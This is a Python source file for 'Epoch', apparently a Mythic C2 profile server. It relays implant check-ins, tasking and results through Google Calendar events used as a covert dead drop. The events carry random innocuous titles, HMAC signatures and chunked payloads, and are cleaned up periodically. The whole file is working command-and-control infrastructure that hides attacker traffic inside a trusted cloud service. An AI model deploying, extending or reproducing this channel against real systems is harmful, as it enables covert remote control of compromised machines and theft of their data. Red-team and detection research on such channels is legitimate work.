#!/usr/bin/env python3
"""
Epoch - Google Calendar Dead Drop C2 Server (Protocol V2)

Transparent relay between Mythic and agents via Google Calendar.
The server never decrypts agent messages — it reads only routing
metadata stored in extendedProperties to move opaque blobs between
Mythic's /agent_message endpoint and calendar events.

Event routing uses extendedProperties.private:
  - proto_version: "2"
  - msg_type: checkin | tasking | cmd | resp
  - agent_id: full 36-char callback UUID
  - message_id: unique ID per logical message
"""

import asyncio
import json
import base64
import os
import sys
import random
import uuid as uuid_module
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional
from pathlib import Path

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from protocol_v2 import (
    EVENT_TITLES,
    MSG_CHECKIN,
    MSG_CMD,
    MSG_RESP,
    MSG_TASKING,
    PROTO_VERSION,
    SINGLE_EVENT_CAPACITY,
    pack_event_fields,
    sign_event_payload,
    unpack_event_fields,
    verify_event_sig,
)

# Scopes for Google Calendar API
SCOPES = ['https://www.googleapis.com/auth/calendar']


class StateStore:
    """Persistent state with atomic JSON writes.

    Tracks known agents, pending chunked messages, and active tasks
    so the server can recover after a restart.
    """

    def __init__(self, path: Path):
        self.path = path
        self._data: dict = {
            'known_agents': [],
            'pending_chunks': {},
            'active_tasks': {},
            'last_saved': '',
        }
        self.load()

    def load(self):
        if self.path.exists():
            try:
                with open(self.path, 'r') as f:
                    self._data = json.load(f)
            except (json.JSONDecodeError, OSError):
                pass

    def save(self):
        self._data['last_saved'] = datetime.now(timezone.utc).isoformat()
        tmp_path = self.path.with_suffix('.tmp')
        try:
            with open(tmp_path, 'w') as f:
                json.dump(self._data, f, indent=2)
            tmp_path.replace(self.path)
        except OSError:
            pass

    @property
    def known_agents(self) -> list:
        return self._data.get('known_agents', [])

    @known_agents.setter
    def known_agents(self, value: list):
        self._data['known_agents'] = value

    @property
    def pending_chunks(self) -> dict:
        return self._data.get('pending_chunks', {})

    @pending_chunks.setter
    def pending_chunks(self, value: dict):
        self._data['pending_chunks'] = value

    @property
    def active_tasks(self) -> dict:
        return self._data.get('active_tasks', {})

    @active_tasks.setter
    def active_tasks(self, value: dict):
        self._data['active_tasks'] = value


class EpochServer:
    """Google Calendar Dead Drop C2 Server — Protocol V2"""

    def __init__(self, config_file='config.json'):
        self.config = self.load_config(config_file)
        self.service = None
        self.calendar_id = self.config.get('calendar_id', 'primary')
        if not self.config.get('calendar_id'):
            self._config_warning = (
                "calendar_id missing in c2_code/config.json — build a Chronos payload "
                "to run Epoch config check before starting the profile"
            )
        else:
            self._config_warning = None

        nginx_host = os.environ.get('MYTHIC_NGINX_HOST', 'mythic_nginx')
        nginx_port = os.environ.get('MYTHIC_NGINX_PORT', '7443')
        self.mythic_url = f"https://{nginx_host}:{nginx_port}/api/v1.4/agent_message"
        # Mythic uses self-signed certs internally; verify=False is expected
        # for intra-container communication. Set verify_mythic_tls=true in
        # config.json if you've installed a trusted cert on mythic_nginx.
        self.verify_mythic_tls = self.config.get('verify_mythic_tls', False)

        self.running = True
        dbg = self.config.get('debug', False)
        if isinstance(dbg, bool):
            self.debug = dbg
        else:
            self.debug = str(dbg).lower() in ('true', '1', 'yes')

        # Persistent state
        self.state_path = Path(__file__).parent / 'state.json'
        self.state = StateStore(self.state_path)
        self.known_agents: set = set(self.state.known_agents)
        self.active_tasks: Dict[str, dict] = dict(self.state.active_tasks)
        self.pending_chunks: Dict[str, dict] = dict(self.state.pending_chunks)

        # Track agents whose UUIDs Mythic no longer recognizes (404)
        self.stale_agents: set = set(self.state._data.get('stale_agents', []))

        # Cache the size of an empty get_tasking response per agent.
        self._empty_response_len: Dict[str, int] = dict(
            self.state._data.get('empty_response_len', {}))

        # Event HMAC key for authenticating calendar events.
        self.event_hmac_key = self._load_hmac_key()

        # Track cmd event deliveries for retry logic.
        # {agent_id: {response_data, created_at, retries, kind, message_id, max_retries, timeout}}
        self._pending_deliveries: Dict[str, dict] = {}
        self._delivery_timeout = self.config.get('delivery_timeout', 120)
        self._max_retries = 3
        self._checkin_delivery_timeout = self.config.get('checkin_delivery_timeout', 45)
        self._checkin_max_retries = self.config.get('checkin_max_retries', 6)

    def _load_hmac_key(self) -> Optional[bytes]:
        """Load the event HMAC key from config, or None if not set."""
        key_b64 = self.config.get('event_hmac_key', '')
        if key_b64:
            try:
                return base64.b64decode(key_b64)
            except Exception:
                pass
        return None

    def _verify_event_sig(self, event: dict) -> bool:
        """Verify an event's HMAC signature. Returns True if valid or signing disabled."""
        return verify_event_sig(event, self.event_hmac_key)

    # ── Configuration ──────────────────────────────────────────────

    def load_config(self, config_file: str) -> dict:
        config_path = Path(__file__).parent / config_file
        if not config_path.exists():
            return {}
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except json.JSONDecodeError as e:
            self._log_config_error(
                f"Invalid JSON in {config_path.name} ({e}) — "
                "build a Chronos payload to run config check and rewrite the file"
            )
            return {}

    def _log_config_error(self, message: str):
        """Log config errors before self.log is fully wired (load_config runs in __init__)."""
        line = f"[Epoch] {datetime.now(timezone.utc).isoformat()} - {message}"
        try:
            log_path = Path(__file__).parent / 'server.log'
            with open(log_path, 'a') as f:
                f.write(line + '\n')
        except OSError:
            pass

    def log(self, message: str):
        line = f"[Epoch] {datetime.now(timezone.utc).isoformat()} - {message}"
        # Always persist to server.log for ops/reliability analysis.
        # Stdout only when debug is enabled (Mythic UI toggle).
        if self.debug:
            print(line, flush=True)
        try:
            log_path = Path(__file__).parent / 'server.log'
            with open(log_path, 'a') as f:
                f.write(line + '\n')
        except OSError:
            pass

    def _save_state(self):
        """Persist current state to disk."""
        self.state.known_agents = list(self.known_agents)
        self.state.active_tasks = dict(self.active_tasks)
        self.state.pending_chunks = dict(self.pending_chunks)
        self.state._data['stale_agents'] = list(self.stale_agents)
        self.state._data['empty_response_len'] = dict(self._empty_response_len)
        self.state.save()

    # ── Google Auth ────────────────────────────────────────────────

    def authenticate_google(self):
        creds = None
        token_path = Path(__file__).parent / 'token.pickle'
        creds_path = Path(__file__).parent / 'credentials.json'

        if not creds_path.exists():
            self.log("ERROR: credentials.json not found!")
            sys.exit(1)

        with open(creds_path, 'r') as f:
            creds_dict = json.load(f)

        if creds_dict.get('type') == 'service_account':
            from google.oauth2 import service_account as sa
            creds = sa.Credentials.from_service_account_info(creds_dict, scopes=SCOPES)
            self.log("Service Account authentication successful!")
        elif 'installed' in creds_dict or 'web' in creds_dict:
            import pickle
            if token_path.exists():
                with open(token_path, 'rb') as token:
                    creds = pickle.load(token)
            if not creds or not creds.valid:
                if creds and creds.expired and creds.refresh_token:
                    creds.refresh(Request())
                else:
                    self.log("ERROR: OAuth2 requires interactive auth — use Service Account")
                    sys.exit(1)
                with open(token_path, 'wb') as token:
                    pickle.dump(creds, token)
            self.log("OAuth2 authentication successful!")
        else:
            self.log("ERROR: Invalid credentials format")
            sys.exit(1)

        self.service = build('calendar', 'v3', credentials=creds)
        return self.service

    # ── Calendar Helpers ───────────────────────────────────────────

    def _random_title(self) -> str:
        return random.choice(EVENT_TITLES)

    def _utcnow(self) -> datetime:
        return datetime.now(timezone.utc)

    def _create_event_raw(self, agent_id: str, msg_type: str,
                          description: str, location: str,
                          ext_chunks: dict, message_id: str,
                          seq: int = 0, total: int = 1) -> Optional[str]:
        """Create a single calendar event with packed fields."""
        try:
            now = self._utcnow()
            props = {
                'proto_version': PROTO_VERSION,
                'msg_type': msg_type,
                'agent_id': agent_id,
                'message_id': message_id,
                'created_at': now.isoformat(),
                'seq': str(seq),
                'total': str(total),
            }
            sig = sign_event_payload(
                self.event_hmac_key, description, location, ext_chunks)
            if sig:
                props['event_sig'] = sig
            props.update(ext_chunks)

            event = {
                'summary': self._random_title(),
                'description': description,
                'location': location,
                'start': {
                    'dateTime': (now + timedelta(hours=1)).isoformat(),
                    'timeZone': 'UTC',
                },
                'end': {
                    'dateTime': (now + timedelta(hours=2)).isoformat(),
                    'timeZone': 'UTC',
                },
                'extendedProperties': {'private': props},
                'reminders': {'useDefault': False, 'overrides': []},
            }

            created = self.service.events().insert(
                calendarId=self.calendar_id, body=event
            ).execute()

            event_id = created['id']
            self.log(f"Created {msg_type} event {event_id} (seq {seq}/{total}) for agent {agent_id[:8]}")
            return event_id

        except HttpError as e:
            self.log(f"Error creating event: {e}")
            return None

    def _create_event(self, agent_id: str, msg_type: str,
                      data: str, message_id: Optional[str] = None) -> Optional[str]:
        """Create calendar event(s) with automatic chunking.

        If data fits in one event, creates one. Otherwise, chunks across
        multiple events sharing the same message_id.

        Returns the event_id of the first event (or None on failure).
        """
        if not message_id:
            message_id = str(uuid_module.uuid4())

        if len(data) <= SINGLE_EVENT_CAPACITY:
            desc, loc, ext_chunks = pack_event_fields(data)
            return self._create_event_raw(
                agent_id, msg_type, desc, loc, ext_chunks, message_id)

        # Multi-event chunking
        chunks = []
        remaining = data
        while remaining:
            chunk = remaining[:SINGLE_EVENT_CAPACITY]
            chunks.append(chunk)
            remaining = remaining[SINGLE_EVENT_CAPACITY:]

        total = len(chunks)
        self.log(f"Chunking {len(data)} bytes into {total} events for agent {agent_id[:8]}")

        first_event_id = None
        for seq, chunk in enumerate(chunks):
            desc, loc, ext_chunks = pack_event_fields(chunk)
            event_id = self._create_event_raw(
                agent_id, msg_type, desc, loc, ext_chunks,
                message_id, seq=seq, total=total)
            if seq == 0:
                first_event_id = event_id

        return first_event_id

    def _find_events_by_type(self, msg_type: str,
                             agent_id: Optional[str] = None) -> List[dict]:
        """Find V2 events by msg_type, optionally filtered by agent_id."""
        try:
            now = self._utcnow()
            time_min = (now - timedelta(minutes=30)).isoformat()
            time_max = (now + timedelta(hours=4)).isoformat()

            # Use privateExtendedProperty filter for efficient querying
            filters = [
                f'proto_version={PROTO_VERSION}',
                f'msg_type={msg_type}',
            ]
            if agent_id:
                filters.append(f'agent_id={agent_id}')

            events_result = self.service.events().list(
                calendarId=self.calendar_id,
                timeMin=time_min,
                timeMax=time_max,
                singleEvents=True,
                orderBy='startTime',
                privateExtendedProperty=filters,
            ).execute()

            return events_result.get('items', [])

        except HttpError as e:
            self.log(f"Error finding {msg_type} events: {e}")
            return []

    def _delete_event(self, event_id: str):
        try:
            self.service.events().delete(
                calendarId=self.calendar_id, eventId=event_id
            ).execute()
            self.log(f"Deleted event {event_id}")
        except HttpError as e:
            # 410 Gone means already deleted — this is expected when both
            # the agent and server race to delete the same event.
            if e.resp.status == 410:
                self.log(f"Event {event_id} already deleted (410)")
            elif e.resp.status == 404:
                self.log(f"Event {event_id} not found (404)")
            else:
                self.log(f"Error deleting event {event_id}: {e}")

    def _get_event_props(self, event: dict) -> dict:
        """Extract extendedProperties.private from an event."""
        return event.get('extendedProperties', {}).get('private', {})

    # ── Mythic Communication ───────────────────────────────────────

    async def forward_to_mythic(self, message_data: bytes,
                               agent_id: str = '') -> bytes:
        """Forward an opaque base64 message to Mythic's agent_message endpoint.

        Returns the response bytes on success, empty bytes on failure.
        When Mythic returns 404 (unknown UUID), marks the agent as stale.
        """
        try:
            headers = {'Mythic': 'epoch'}
            self.log(f"Forwarding {len(message_data)} bytes to Mythic")

            response = requests.post(
                self.mythic_url,
                data=message_data,
                headers=headers,
                verify=self.verify_mythic_tls,
                timeout=30,
            )

            if response.status_code == 200:
                self.log(f"Mythic returned {len(response.content)} bytes")
                return response.content
            elif response.status_code == 404:
                self.log(f"Mythic 404 for agent {agent_id[:8] if agent_id else '?'} — marking stale")
                if agent_id:
                    self.stale_agents.add(agent_id)
                return b''
            else:
                self.log(f"Mythic returned status {response.status_code}: {response.text[:200]}")
                return b''

        except Exception as e:
            self.log(f"Error forwarding to Mythic: {e}")
            return b''

    # ── Checkin Processing ─────────────────────────────────────────

    async def process_checkins(self) -> int:
        """Find checkin events, forward to Mythic, create response events.

        Returns the number of checkin events found this cycle (for fast-path).
        """
        events = self._find_events_by_type(MSG_CHECKIN)
        if events:
            self.log(f"Found {len(events)} checkin(s) at_ts={self._utcnow().isoformat()}")

        for event in events:
            props = self._get_event_props(event)
            agent_id = props.get('agent_id', '')
            data = unpack_event_fields(event)

            if not data or not self._verify_event_sig(event):
                self._delete_event(event['id'])
                continue

            t_mythic = self._utcnow()
            response = await self.forward_to_mythic(data.encode(), agent_id=agent_id)

            if response:
                # Mythic returns a response (callback ID assignment, etc.)
                # Create a cmd event with the response for the agent to pick up
                response_data = response.decode()
                message_id = str(uuid_module.uuid4())
                event_id = self._create_event(
                    agent_id, MSG_CMD, response_data, message_id=message_id)
                if event_id:
                    self._pending_deliveries[agent_id] = {
                        'response_data': response_data,
                        'created_at': self._utcnow().isoformat(),
                        'retries': 0,
                        'kind': 'checkin',
                        'message_id': message_id,
                        'timeout': self._checkin_delivery_timeout,
                        'max_retries': self._checkin_max_retries,
                    }
                    self.log(
                        f"Checkin cmd created event={event_id} agent={agent_id[:8]} "
                        f"message_id={message_id[:8]} mythic_ts={t_mythic.isoformat()}"
                    )
                is_new = agent_id not in self.known_agents
                self.known_agents.add(agent_id)
                if is_new:
                    self.log(f"New agent discovered: {agent_id[:8]} (total: {len(self.known_agents)})")
                self.log(f"Processed checkin for agent {agent_id[:8]}")

            # Delete the checkin event
            self._delete_event(event['id'])

        return len(events)
    # ── Tasking Processing ─────────────────────────────────────────

    async def process_tasking_requests(self):
        """Find tasking request events, forward to Mythic, create cmd events.

        Queries all tasking events (agents discovered via agent_id in each event).
        New agents are auto-discovered and added to known_agents.
        Skips agents that Mythic no longer recognizes (stale UUIDs).
        Skips creating cmd events for empty get_tasking responses (no tasks).
        """
        events = self._find_events_by_type(MSG_TASKING)
        if events:
            self.log(f"Found {len(events)} tasking request(s)")

        for event in events:
            props = self._get_event_props(event)
            agent_id = props.get('agent_id', '')
            data = unpack_event_fields(event)

            if not data or not self._verify_event_sig(event):
                self._delete_event(event['id'])
                continue

            if agent_id in self.stale_agents:
                self.log(f"Skipping stale agent {agent_id[:8]}")
                self._delete_event(event['id'])
                continue

            # Auto-discover agents from tasking requests
            if agent_id and agent_id not in self.known_agents:
                self.known_agents.add(agent_id)
                self.log(f"Discovered agent from tasking: {agent_id[:8]} (total: {len(self.known_agents)})")

            # Agent is alive and requesting tasks — drop any outstanding checkin delivery
            pending = self._pending_deliveries.get(agent_id)
            if pending and pending.get('kind') == 'checkin':
                self._pending_deliveries.pop(agent_id, None)
                self.log(f"Cleared checkin pending delivery for {agent_id[:8]} (tasking seen)")

            # Forward to Mythic
            response = await self.forward_to_mythic(data.encode(), agent_id=agent_id)

            if not response:
                # Empty response — Mythic didn't return anything (or 404)
                self._delete_event(event['id'])
                continue

            response_data = response.decode()
            response_len = len(response_data)

            # Check if Mythic returned 404 (agent not found) — detected
            # by forward_to_mythic returning empty bytes on non-200.
            # We handle this above (response is falsy).

            # Always relay every Mythic response to the agent as a cmd event.
            # The agent decrypts and handles empty vs task-bearing responses.
            # Previous heuristic-based filtering caused silent task drops.
            self.log(f"Relaying {response_len} bytes to {agent_id[:8]}")
            event_id = self._create_event(agent_id, MSG_CMD, response_data)
            if event_id:
                self._pending_deliveries[agent_id] = {
                    'response_data': response_data,
                    'created_at': self._utcnow().isoformat(),
                    'retries': 0,
                    'kind': 'tasking',
                    'timeout': self._delivery_timeout,
                    'max_retries': self._max_retries,
                }
                for tid, info in self.active_tasks.items():
                    if 'event_id' not in info and info.get('agent_uuid') == agent_id:
                        info['event_id'] = event_id

            # Delete the tasking request event
            self._delete_event(event['id'])

    # ── Response Processing ────────────────────────────────────────

    async def poll_for_agent_responses(self):
        """Find response events from agents, reassemble chunks, forward to Mythic."""
        events = self._find_events_by_type(MSG_RESP)
        if events:
            self.log(f"Found {len(events)} response event(s)")

        for event in events:
            props = self._get_event_props(event)
            agent_id = props.get('agent_id', '')
            message_id = props.get('message_id', '')
            seq = int(props.get('seq', '0'))
            total = int(props.get('total', '1'))

            if not agent_id or not self._verify_event_sig(event):
                self._delete_event(event['id'])
                continue

            data = unpack_event_fields(event)

            if total == 1:
                self.log(f"Forwarding response from agent {agent_id[:8]}")
                result = await self.forward_to_mythic(data.encode(), agent_id=agent_id)
                if result:
                    self.log(f"Response forwarded for agent {agent_id[:8]}")
                    self._pending_deliveries.pop(agent_id, None)
                    # Relay Mythic's acknowledgment back to the agent as a cmd
                    # event. This carries file_ids for downloads and chunk_data
                    # for uploads — required for multi-round file transfers.
                    result_data = result.decode()
                    self._create_event(agent_id, MSG_CMD, result_data)
                    self.log(f"Relayed response-ack ({len(result_data)} bytes) to {agent_id[:8]}")
                self._delete_event(event['id'])
            else:
                # Multi-event chunked response — collect chunks
                if message_id not in self.pending_chunks:
                    self.pending_chunks[message_id] = {
                        'total': total,
                        'chunks': {},
                        'agent_id': agent_id,
                        'event_ids': [],
                    }

                pending = self.pending_chunks[message_id]
                pending['chunks'][seq] = data
                pending['event_ids'].append(event['id'])

                self.log(f"Collected chunk {seq+1}/{total} for message {message_id[:8]}")

                # Check if all chunks are received
                if len(pending['chunks']) == total:
                    # Reassemble in order
                    full_data = ''.join(
                        pending['chunks'][i] for i in range(total)
                    )

                    self.log(f"Reassembled {len(full_data)} bytes from {total} chunks for agent {agent_id[:8]}")
                    result = await self.forward_to_mythic(full_data.encode(), agent_id=agent_id)
                    if result:
                        self.log(f"Chunked response forwarded for agent {agent_id[:8]}")
                        self._pending_deliveries.pop(agent_id, None)
                        result_data = result.decode()
                        self._create_event(agent_id, MSG_CMD, result_data)
                        self.log(f"Relayed chunked response-ack to {agent_id[:8]}")

                    # Clean up all chunk events
                    for eid in pending['event_ids']:
                        self._delete_event(eid)
                    del self.pending_chunks[message_id]

    # ── Delivery Retry ──────────────────────────────────────────────

    async def retry_stale_deliveries(self):
        """Re-create cmd events for deliveries the agent hasn't acknowledged."""
        now = self._utcnow()
        to_remove = []

        for agent_id, delivery in self._pending_deliveries.items():
            try:
                created = datetime.fromisoformat(delivery['created_at'])
                if created.tzinfo is None:
                    created = created.replace(tzinfo=timezone.utc)
                age = (now - created).total_seconds()
            except (ValueError, TypeError):
                to_remove.append(agent_id)
                continue

            timeout = delivery.get('timeout', self._delivery_timeout)
            max_retries = delivery.get('max_retries', self._max_retries)
            kind = delivery.get('kind', 'tasking')

            if age < timeout:
                continue

            retries = delivery.get('retries', 0)
            if retries >= max_retries:
                self.log(
                    f"Giving up on {kind} delivery to {agent_id[:8]} "
                    f"after {retries} retries"
                )
                to_remove.append(agent_id)
                continue

            self.log(
                f"Retrying {kind} delivery to {agent_id[:8]} "
                f"(attempt {retries + 1}/{max_retries}, {age:.0f}s old)"
            )
            # Reuse message_id for checkin so agent can dedup duplicate cmds
            kwargs = {}
            if delivery.get('message_id'):
                kwargs['message_id'] = delivery['message_id']
            event_id = self._create_event(
                agent_id, MSG_CMD, delivery['response_data'], **kwargs)
            if event_id:
                delivery['created_at'] = now.isoformat()
                delivery['retries'] = retries + 1
                self.log(f"Retry {kind} cmd event={event_id} for {agent_id[:8]}")
            else:
                to_remove.append(agent_id)

        for agent_id in to_remove:
            self._pending_deliveries.pop(agent_id, None)

    def _has_checkin_pending(self) -> bool:
        return any(d.get('kind') == 'checkin' for d in self._pending_deliveries.values())
    # ── Garbage Collection ─────────────────────────────────────────

    async def cleanup_stale_events(self):
        """Delete V2 events older than max_event_age or from stale agents."""
        max_age_hours = self.config.get('max_event_age_hours', 3)
        cutoff = self._utcnow() - timedelta(hours=max_age_hours)

        try:
            now = self._utcnow()
            events_result = self.service.events().list(
                calendarId=self.calendar_id,
                timeMin=(now - timedelta(hours=max_age_hours + 1)).isoformat(),
                timeMax=(now + timedelta(hours=4)).isoformat(),
                singleEvents=True,
                privateExtendedProperty=[f'proto_version={PROTO_VERSION}'],
            ).execute()

            stale_count = 0
            for event in events_result.get('items', []):
                props = self._get_event_props(event)
                agent_id = props.get('agent_id', '')

                # Delete events from stale agents immediately
                if agent_id in self.stale_agents:
                    self._delete_event(event['id'])
                    stale_count += 1
                    continue

                # Delete events older than max_event_age
                created_at_str = props.get('created_at', '')
                if created_at_str:
                    try:
                        created_at = datetime.fromisoformat(created_at_str)
                        if created_at.tzinfo is None:
                            created_at = created_at.replace(tzinfo=timezone.utc)
                        if created_at < cutoff:
                            self._delete_event(event['id'])
                            stale_count += 1
                    except (ValueError, TypeError):
                        pass

            if stale_count:
                self.log(f"Cleaned up {stale_count} stale event(s)")

        except HttpError as e:
            self.log(f"Error in cleanup: {e}")

    # ── Startup Recovery ─────────────────────────────────────────

    async def recover_state(self):
        """Scan calendar for orphaned V2 events and resume processing.

        Called once at startup after authentication. Discovers agents
        from existing events and processes any orphaned responses.
        """
        self.log("Running startup recovery...")

        try:
            now = self._utcnow()
            events_result = self.service.events().list(
                calendarId=self.calendar_id,
                timeMin=(now - timedelta(hours=2)).isoformat(),
                timeMax=(now + timedelta(hours=4)).isoformat(),
                singleEvents=True,
                privateExtendedProperty=[f'proto_version={PROTO_VERSION}'],
            ).execute()

            events = events_result.get('items', [])
            if not events:
                self.log("No orphaned events found")
                return

            self.log(f"Found {len(events)} V2 event(s) on calendar")

            for event in events:
                props = self._get_event_props(event)
                agent_id = props.get('agent_id', '')
                msg_type = props.get('msg_type', '')

                if agent_id:
                    self.known_agents.add(agent_id)

                # Log what we found
                self.log(f"  Orphaned {msg_type} event for agent {agent_id[:8]}")

            self._save_state()
            self.log(f"Recovery complete. Known agents: {len(self.known_agents)}")

        except HttpError as e:
            self.log(f"Error during recovery: {e}")

    # ── Main Loop ──────────────────────────────────────────────────

    async def run(self):
        self.log("Starting Epoch Server (Protocol V2)...")

        # Wait for credentials
        creds_path = Path(__file__).parent / 'credentials.json'
        retry_count = 0
        while not creds_path.exists() and retry_count < 30:
            self.log(f"Waiting for credentials file... ({retry_count + 1}/30)")
            await asyncio.sleep(10)
            retry_count += 1

        if not creds_path.exists():
            self.log("ERROR: Credentials file not found after 5 minutes. "
                     "Use Mythic UI to configure the Epoch C2 profile with a credentials file.")
            # Wait another 5 minutes max, then give up
            for _ in range(10):
                if creds_path.exists():
                    break
                await asyncio.sleep(30)
            if not creds_path.exists():
                self.log("FATAL: Credentials file never appeared. Exiting.")
                return

        if self._config_warning:
            self.log(f"WARNING: {self._config_warning}")

        # Authenticate
        try:
            self.authenticate_google()
            self.log(f"Using calendar: {self.calendar_id}")
        except Exception as e:
            self.log(f"ERROR: Authentication failed: {e}")
            await asyncio.sleep(30)
            return await self.run()

        # Recover state from previous run
        await self.recover_state()

        poll_interval = self.config.get('poll_interval', 15)
        cleanup_counter = 0
        cleanup_every = 10  # Run cleanup every N poll cycles
        save_counter = 0
        save_every = 5  # Save state every N poll cycles

        self.log(f"Epoch Server running. Poll interval: {poll_interval}s")
        poll_count = 0

        while self.running:
            try:
                poll_count += 1
                await self.poll_for_agent_responses()
                checkins_found = await self.process_checkins()
                await self.process_tasking_requests()
                await self.retry_stale_deliveries()

                # Fast-path: when checkins were seen or checkin cmds are pending
                # delivery, do an extra pass after a short sleep to cut Hop A/B lag.
                if checkins_found or self._has_checkin_pending():
                    await asyncio.sleep(3)
                    await self.poll_for_agent_responses()
                    await self.process_checkins()
                    await self.process_tasking_requests()
                    await self.retry_stale_deliveries()

                # Periodic cleanup
                cleanup_counter += 1
                if cleanup_counter >= cleanup_every:
                    await self.cleanup_stale_events()
                    cleanup_counter = 0

                # Periodic state save and heartbeat
                save_counter += 1
                if save_counter >= save_every:
                    self._save_state()
                    pending_checkin = sum(
                        1 for d in self._pending_deliveries.values()
                        if d.get('kind') == 'checkin'
                    )
                    self.log(
                        f"[HEARTBEAT] Poll #{poll_count}, agents: {len(self.known_agents)}, "
                        f"stale: {len(self.stale_agents)}, "
                        f"pending_deliveries: {len(self._pending_deliveries)}, "
                        f"checkin_pending: {pending_checkin}"
                    )
                    save_counter = 0
                await asyncio.sleep(poll_interval)

            except KeyboardInterrupt:
                self.log("Shutting down...")
                self.running = False
            except Exception as e:
                self.log(f"Error in main loop: {e}")
                import traceback
                self.log(traceback.format_exc())
                await asyncio.sleep(5)

        # Save state on clean shutdown
        self._save_state()
        self.log("State saved. Server stopped.")


if __name__ == "__main__":
    server = EpochServer()
    asyncio.run(server.run())
